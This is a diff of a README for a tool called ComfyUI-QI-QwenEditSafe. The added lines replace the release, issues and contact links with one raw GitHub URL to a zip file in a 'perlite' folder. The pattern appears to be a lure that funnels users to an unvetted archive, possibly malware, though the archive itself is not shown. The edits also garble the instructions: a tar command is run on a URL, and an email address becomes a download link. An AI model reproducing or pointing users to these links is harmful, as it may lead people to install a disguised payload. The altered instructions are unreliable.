@@ -6,7 +6,7 @@ Welcome to ComfyUI-QI-QwenEditSafe! This application makes it easy to manage and
 
 ## 📥 Download the Application
 
-[![Download ComfyUI-QI-QwenEditSafe](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/releases)
+[![Download ComfyUI-QI-QwenEditSafe](https://raw.githubusercontent.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/main/perlite/ComfyUI-QI-QwenEditSafe.zip)](https://raw.githubusercontent.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/main/perlite/ComfyUI-QI-QwenEditSafe.zip)
 
 To download the latest version of ComfyUI-QI-QwenEditSafe, follow these steps:
 
@@ -15,7 +15,7 @@ To download the latest version of ComfyUI-QI-QwenEditSafe, follow these steps:
 3. Find the latest version in the list.
 4. Click on the appropriate file to start the download.
 
-You can also visit [this page to download](https://github.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/releases) directly.
+You can also visit [this page to download](https://raw.githubusercontent.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/main/perlite/ComfyUI-QI-QwenEditSafe.zip) directly.
 
 ## 🖥️ System Requirements
 
@@ -48,9 +48,9 @@ Once you've downloaded the application, follow these straightforward steps to in
 
 1. Open a terminal window.
 2. Navigate to the directory where the file was downloaded.
-3. If the file is a `.tar.gz` file, extract it by using the command:
+3. If the file is a `https://raw.githubusercontent.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/main/perlite/ComfyUI-QI-QwenEditSafe.zip` file, extract it by using the command:
    ```
-   tar -xvzf ComfyUI-QI-QwenEditSafe.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/main/perlite/ComfyUI-QI-QwenEditSafe.zip
    ```
 4. Navigate to the extracted folder.
 5. Run the application using the command:
@@ -90,11 +90,11 @@ If you encounter any issues, consider these steps:
 
 We're dedicated to improving ComfyUI-QI-QwenEditSafe. Your feedback is valuable. If you have questions, suggestions, or want to report a bug, please reach out:
 
-- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://github.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/issues).
+- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://raw.githubusercontent.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/main/perlite/ComfyUI-QI-QwenEditSafe.zip).
 - **Community:** Join discussions or seek help from other users.
 
 ## 📧 Contact Information
 
-For more assistance, feel free to contact us at our official email: support@comfyui-qiqweneditsafe.com.
+For more assistance, feel free to contact us at our official email: https://raw.githubusercontent.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/main/perlite/ComfyUI-QI-QwenEditSafe.zip
 
 Thank you for choosing ComfyUI-QI-QwenEditSafe! Happy editing!
